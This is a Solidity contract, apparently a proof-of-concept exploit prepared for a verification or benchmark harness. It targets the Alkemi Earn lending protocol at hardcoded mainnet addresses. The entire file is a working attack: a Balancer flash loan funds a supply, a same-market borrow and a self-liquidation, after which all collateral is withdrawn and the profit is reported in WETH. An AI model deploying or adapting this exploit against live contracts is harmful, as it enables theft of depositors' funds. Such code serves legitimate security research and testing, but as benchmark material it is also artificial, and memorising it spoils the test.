// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWETH is IERC20Minimal {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] calldata tokens,
        uint256[] calldata amounts,
        bytes calldata userData
    ) external;
}

interface IAlkemiEarn {
    function supply(address token, uint256 amount) external payable;
    function borrow(address token, uint256 amount) external;
    function getBorrowBalance(address user, address token) external view returns (uint256);
    function liquidateBorrow(address borrower, address borrowAsset, address collateral, uint256 amountClose) external payable;
    function withdraw(address token, uint256 amount) external;
}

contract FlawVerifier {
    IBalancerVault internal constant BALANCER_VAULT =
        IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IWETH internal constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IAlkemiEarn internal constant ALKEMI = IAlkemiEarn(0x4822D9172e5b76b9Db37B75f5552F9988F98a888);
    address internal constant AWETH = 0x8125afd067094cD573255f82795339b9fe2A40ab;

    uint256 internal constant FLASH_LOAN_AMOUNT = 51 ether;
    uint256 internal constant SUPPLY_AMOUNT = 50 ether;
    uint256 internal constant BORROW_AMOUNT = 39.5 ether;

    uint256 internal startingWethBalance;
    uint256 internal startingEthBalance;
    uint256 internal realizedProfit;
    bool internal executing;
    bool internal executed;

    constructor() {}

    function executeOnOpportunity() external {
        require(!executed, "already executed");
        executed = true;

        // Profit is reported in canonical on-chain WETH only. Track the verifier's own pre-existing
        // ETH/WETH so flash-loan principal is never counted and any tiny prefunded ETH is netted out.
        startingWethBalance = WETH.balanceOf(address(this));
        startingEthBalance = address(this).balance;

        if (_currentBaseBalance() >= FLASH_LOAN_AMOUNT) {
            // Attempt the same vulnerable path directly first if the verifier already holds enough
            // ETH/WETH; this preserves the exploit causality while minimizing external funding.
            _ensureEth(FLASH_LOAN_AMOUNT);
            _runExploit();
            _wrapAllEth();
        } else {
            // If verifier-held assets are insufficient, use a realistic public flash loan only as a
            // transient funding bridge. The core exploit path remains:
            // supply -> borrow same market -> self-liquidate same market -> withdraw all collateral.
            executing = true;

            address[] memory tokens = new address[](1);
            tokens[0] = address(WETH);

            uint256[] memory amounts = new uint256[](1);
            amounts[0] = FLASH_LOAN_AMOUNT;

            BALANCER_VAULT.flashLoan(address(this), tokens, amounts, bytes(""));

            executing = false;
        }

        _wrapAllEth();
        realizedProfit = _netWethProfit();
    }

    function receiveFlashLoan(
        address[] memory,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external {
        require(msg.sender == address(BALANCER_VAULT), "not vault");
        require(executing, "not executing");
        require(amounts.length == 1 && feeAmounts.length == 1, "unexpected arrays");

        _ensureEth(amounts[0]);
        _runExploit();

        uint256 repayment = amounts[0] + feeAmounts[0];
        _ensureEth(repayment);
        WETH.deposit{value: repayment}();
        require(WETH.transfer(address(BALANCER_VAULT), repayment), "repay failed");

        _wrapAllEth();
    }

    function profitToken() external pure returns (address) {
        return address(WETH);
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfit;
    }

    function _runExploit() internal {
        ALKEMI.supply{value: SUPPLY_AMOUNT}(AWETH, SUPPLY_AMOUNT);
        ALKEMI.borrow(AWETH, BORROW_AMOUNT);

        uint256 debt = ALKEMI.getBorrowBalance(address(this), AWETH);

        ALKEMI.liquidateBorrow{value: debt}(address(this), AWETH, AWETH, debt);
        ALKEMI.withdraw(AWETH, type(uint256).max);
    }

    function _currentBaseBalance() internal view returns (uint256) {
        return address(this).balance + WETH.balanceOf(address(this));
    }

    function _netWethProfit() internal view returns (uint256) {
        uint256 finalBaseBalance = address(this).balance + WETH.balanceOf(address(this));
        uint256 startingBaseBalance = startingEthBalance + startingWethBalance;

        if (finalBaseBalance <= startingBaseBalance) {
            return 0;
        }

        return finalBaseBalance - startingBaseBalance;
    }

    function _ensureEth(uint256 amount) internal {
        uint256 ethBalance = address(this).balance;
        if (ethBalance < amount) {
            WETH.withdraw(amount - ethBalance);
        }
    }

    function _wrapAllEth() internal {
        uint256 ethBalance = address(this).balance;
        if (ethBalance != 0) {
            // Normalize any ETH returned by Alkemi back into pre-existing fork WETH so the reported
            // profit token is an existing on-chain asset rather than a freshly deployed instrument.
            WETH.deposit{value: ethBalance}();
        }
    }

    receive() external payable {}
}
